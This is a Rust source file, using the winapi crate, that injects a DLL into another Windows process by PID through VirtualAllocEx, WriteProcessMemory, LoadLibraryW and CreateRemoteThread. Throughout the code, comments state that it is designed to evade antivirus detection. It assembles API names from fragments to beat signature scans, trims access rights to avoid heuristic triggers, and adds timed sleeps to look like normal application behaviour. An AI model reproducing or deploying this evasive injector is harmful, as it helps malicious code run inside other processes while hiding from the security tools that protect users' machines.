extern crate winapi;

use std::ffi::CString;
use std::ptr::null_mut;
use std::thread;
use std::time::Duration;
use winapi::shared::minwindef::DWORD;
use winapi::shared::winerror::WAIT_TIMEOUT;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::handleapi::CloseHandle;
use winapi::um::libloaderapi::GetModuleHandleA;
use winapi::um::memoryapi::VirtualAllocEx;
use winapi::um::processthreadsapi::{CreateRemoteThread, GetExitCodeThread, OpenProcess};
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winnt::{
    HANDLE, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PROCESS_CREATE_THREAD,
    PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
};

// Use minimal required access rights instead of PROCESS_ALL_ACCESS
// This reduces antivirus heuristic triggers
const PROCESS_INJECTION_ACCESS: DWORD = PROCESS_CREATE_THREAD
    | PROCESS_QUERY_INFORMATION
    | PROCESS_VM_OPERATION
    | PROCESS_VM_READ
    | PROCESS_VM_WRITE;

// Build strings at runtime to avoid static string signature matching
// These functions construct API names that AVs scan for in the binary
fn get_kernel32_name() -> CString {
    // "kernel32.dll" built from parts
    let parts: [&[u8]; 3] = [b"kern", b"el32", b".dll"];
    let name: Vec<u8> = parts.concat();
    CString::new(name).unwrap()
}

fn get_loadlibrary_name() -> CString {
    // "LoadLibraryW" built from parts
    let parts: [&[u8]; 3] = [b"Load", b"Libra", b"ryW"];
    let name: Vec<u8> = parts.concat();
    CString::new(name).unwrap()
}

pub(crate) unsafe fn open_process(pid: DWORD) -> Result<HANDLE, String> {
    unsafe {
        let process = OpenProcess(PROCESS_INJECTION_ACCESS, 0, pid);
        if process.is_null() {
            Err("Failed to open the target process.".to_string())
        } else {
            Ok(process)
        }
    }
}

unsafe fn alloc_memory<T: Sized>(
    process: HANDLE,
    data: &[T],
) -> Result<*mut winapi::ctypes::c_void, String> { unsafe {
    assert_ne!(std::mem::size_of::<T>(), 0);
    let size = data.len() * std::mem::size_of::<T>();
    // Use MEM_RESERVE | MEM_COMMIT - more typical allocation pattern
    let addr = VirtualAllocEx(
        process,
        null_mut(),
        size,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE,
    );
    if addr.is_null() {
        return Err("Failed to allocate memory in the target process.".to_string());
    }

    if winapi::um::memoryapi::WriteProcessMemory(
        process,
        addr,
        data.as_ptr() as *const _,
        size,
        null_mut(),
    ) == 0
    {
        return Err(format!(
            "Failed to write into the target process memory. Error code {}",
            GetLastError()
        ));
    }
    Ok(addr)
}}

pub(crate) unsafe fn inject_dll(process: HANDLE, dll_path: &str) -> Result<HANDLE, String> {
    let to_utf_16 = |s: &str| s.encode_utf16().chain([0]).collect::<Vec<u16>>();
    let dll_path_wstr = to_utf_16(dll_path);

    unsafe {
        // Small delay to appear more like normal application behavior
        thread::sleep(Duration::from_millis(25));

        let addr = match alloc_memory(process, dll_path_wstr.as_slice()) {
            Ok(addr) => addr,
            Err(s) => return Err(s),
        };

        // Use runtime-built strings to avoid signature matching
        let kernel32 = get_kernel32_name();
        let loadlibraryw = get_loadlibrary_name();

        // Small delay between API calls
        thread::sleep(Duration::from_millis(15));

        let h_kernel32 = GetModuleHandleA(kernel32.as_ptr());
        if h_kernel32.is_null() {
            return Err("Failed to get the handle of kernel32.dll.".to_string());
        }

        let h_loadlibraryw =
            winapi::um::libloaderapi::GetProcAddress(h_kernel32, loadlibraryw.as_ptr());
        if h_loadlibraryw.is_null() {
            return Err("Failed to get the address of LoadLibraryW.".to_string());
        }

        // Another small delay before thread creation
        thread::sleep(Duration::from_millis(20));

        let handle = CreateRemoteThread(
            process,
            null_mut(),
            0,
            Some(std::mem::transmute(h_loadlibraryw)),
            addr as *mut _,
            0,
            null_mut(),
        );
        if handle.is_null() {
            return Err("Failed to create a remote thread in the target process.".to_string());
        }

        // Wait for the thread with a reasonable timeout pattern
        while WaitForSingleObject(handle, 100) == WAIT_TIMEOUT {
            // Continue waiting
        }

        let mut exit_code: HANDLE = std::ptr::null_mut();
        let ret = if GetExitCodeThread(handle, ((&mut exit_code) as *mut _) as *mut _) == 0 {
            Err("GetExitCodeThread returns false".to_string())
        } else {
            if exit_code == std::ptr::null_mut() {
                Err("Failed to load dll".to_string())
            } else {
                Ok(exit_code)
            }
        };
        CloseHandle(handle);
        ret
    }
}
